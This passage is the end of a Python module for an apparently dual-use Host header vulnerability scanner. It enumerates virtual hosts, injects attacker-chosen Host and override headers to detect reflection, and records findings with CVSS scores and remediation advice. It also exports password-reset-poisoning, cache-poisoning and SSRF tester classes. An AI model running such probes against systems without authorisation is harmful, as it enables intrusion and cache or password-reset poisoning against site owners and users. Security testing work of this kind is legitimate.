        logger.debug(f"[HostHeader] Enumerating virtual hosts for: {base_host}")

        max_tests = self.config.max_vhosts_to_test if self.config else 100
        discovered = await self.vhost_enumerator.enumerate(
            base_host, base_url, max_tests=max_tests
        )

        for vhost, result in discovered:
            self._create_finding(
                vuln_type=HostVulnType.VIRTUAL_HOST_BRUTE,
                severity="MEDIUM",
                confidence=0.75,
                endpoint=HostEndpoint(url=base_url, original_host=base_host),
                injection_vector=InjectionVector.HOST_HEADER,
                injected_value=vhost,
                description=f"Virtual host discovered: {vhost}",
                impact="Hidden virtual hosts may expose admin panels or sensitive functionality.",
                evidence=result.evidence,
                response_evidence=result.response_body[:500],
            )

    async def _test_host_injection(self, endpoint: HostEndpoint, evil_host: str) -> None:
        """Test generic Host header injection."""
        logger.debug(f"[HostHeader] Testing Host injection: {endpoint.url}")

        # Test all override headers
        for header_name in HOST_OVERRIDE_HEADERS:
            headers = {header_name: evil_host}

            try:
                if self.http_client:
                    await self._acquire_rate_limit()  # FIX: Rate limit before request
                    response = await self.http_client.request(
                        method=endpoint.method,
                        url=endpoint.url,
                        headers=headers,
                    )

                    response_body = response.text if hasattr(response, 'text') else str(response.content)

                    if evil_host.lower() in response_body.lower():
                        self._create_finding(
                            vuln_type=HostVulnType.HOST_HEADER_INJECTION,
                            severity="MEDIUM",
                            confidence=0.80,
                            endpoint=endpoint,
                            injection_vector=InjectionVector.HOST_OVERRIDE,
                            injected_value=f"{header_name}: {evil_host}",
                            description=f"Host header value reflected via {header_name}",
                            impact="May enable further attacks like XSS, open redirect, or cache poisoning.",
                            evidence={"header": header_name},
                            response_evidence=response_body[:500],
                        )
                        return

            except Exception:
                pass

    def _create_finding(
        self,
        vuln_type: HostVulnType,
        severity: str,
        confidence: float,
        endpoint: HostEndpoint,
        injection_vector: InjectionVector,
        injected_value: str,
        description: str,
        impact: str,
        evidence: Dict[str, Any],
        response_evidence: str,
    ) -> None:
        """Create and store a finding."""
        request_example = f"""
{endpoint.method} {endpoint.url}
Host: {injected_value}
{chr(10).join(f'{k}: {v}' for k, v in endpoint.headers.items())}
"""

        finding = HostFinding(
            id=f"HOST-{len(self.findings)+1:04d}",
            vuln_type=vuln_type,
            severity=severity,
            confidence=confidence,
            endpoint=endpoint,
            injection_vector=injection_vector,
            injected_value=injected_value,
            description=description,
            impact=impact,
            remediation=self._generate_remediation(vuln_type),
            evidence=evidence,
            cwe_id=self.CWE_ID,
            cvss_score=self._calculate_cvss(severity),
            request_example=request_example.strip(),
            response_evidence=response_evidence,
        )

        self.findings.append(finding)
        logger.info(f"[HostHeader] Found: {vuln_type.name} ({severity})")

    def _generate_remediation(self, vuln_type: HostVulnType) -> str:
        """Generate remediation advice."""
        common = """
General remediation:
1. Configure web server to require a valid Host header matching expected values
2. Use a whitelist of allowed Host header values
3. Don't use the Host header for URL generation - use a configured base URL
4. Disable support for override headers (X-Forwarded-Host, etc.) unless required
5. Configure reverse proxies to validate/normalize Host headers
"""

        specific = {
            HostVulnType.PASSWORD_RESET_POISONING: (
                "For password reset:\n"
                "- Use a configured, hardcoded base URL for reset links\n"
                "- Never trust the Host header for link generation\n"
                "- Validate Host header against whitelist before processing"
            ),
            HostVulnType.WEB_CACHE_POISONING: (
                "For cache poisoning:\n"
                "- Include Host header in cache key\n"
                "- Validate Host header before caching\n"
                "- Use cache control headers appropriately"
            ),
            HostVulnType.SSRF_VIA_HOST: (
                "For SSRF:\n"
                "- Don't use Host header for internal routing decisions\n"
                "- Implement strict input validation\n"
                "- Use allowlist for internal service communication"
            ),
        }

        advice = specific.get(vuln_type, "")
        return f"{advice}\n{common}"

    def _calculate_cvss(self, severity: str) -> float:
        """Calculate CVSS score based on severity."""
        cvss_map = {
            "CRITICAL": 9.1,
            "HIGH": 7.5,
            "MEDIUM": 5.3,
            "LOW": 3.7,
            "INFO": 0.0,
        }
        return cvss_map.get(severity, 5.0)

    def get_findings(self) -> List[HostFinding]:
        """Get all findings."""
        return self.findings

    def get_statistics(self) -> Dict[str, Any]:
        """Get scan statistics."""
        return {
            "total_findings": len(self.findings),
            "critical_findings": len([f for f in self.findings if f.severity == "CRITICAL"]),
            "high_findings": len([f for f in self.findings if f.severity == "HIGH"]),
            "medium_findings": len([f for f in self.findings if f.severity == "MEDIUM"]),
            "vuln_types": list(set(f.vuln_type.name for f in self.findings)),
            "injection_vectors": list(set(f.injection_vector.name for f in self.findings)),
        }


# =============================================================================
# FACTORY FUNCTIONS
# =============================================================================

def create_host_header_scanner(
    http_client: Any = None,
    config: Optional[ScanConfig] = None,
) -> HostHeaderScanner:
    """Create a configured Host header scanner instance."""
    return HostHeaderScanner(http_client=http_client, config=config)


async def scan_host_headers(
    target_url: str,
    http_client: Any = None,
    **kwargs,
) -> List[HostFinding]:
    """Convenience function to scan for Host header vulnerabilities."""
    scanner = create_host_header_scanner(http_client=http_client)
    return await scanner.scan(target_url, **kwargs)


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Version
    "VERSION",

    # Enums
    "HostVulnType",
    "InjectionVector",

    # Data classes
    "HostEndpoint",
    "HostTestResult",
    "HostFinding",
    "ScanConfig",

    # Classes
    "HostHeaderScanner",
    "PasswordResetPoisoner",
    "HostCachePoisoner",
    "HostSSRFTester",
    "VirtualHostEnumerator",
    "HostManipulator",

    # Constants
    "HOST_OVERRIDE_HEADERS",
    "INTERNAL_HOSTS",
    "CANARY_HOSTS",

    # Factory functions
    "create_host_header_scanner",
    "scan_host_headers",
]
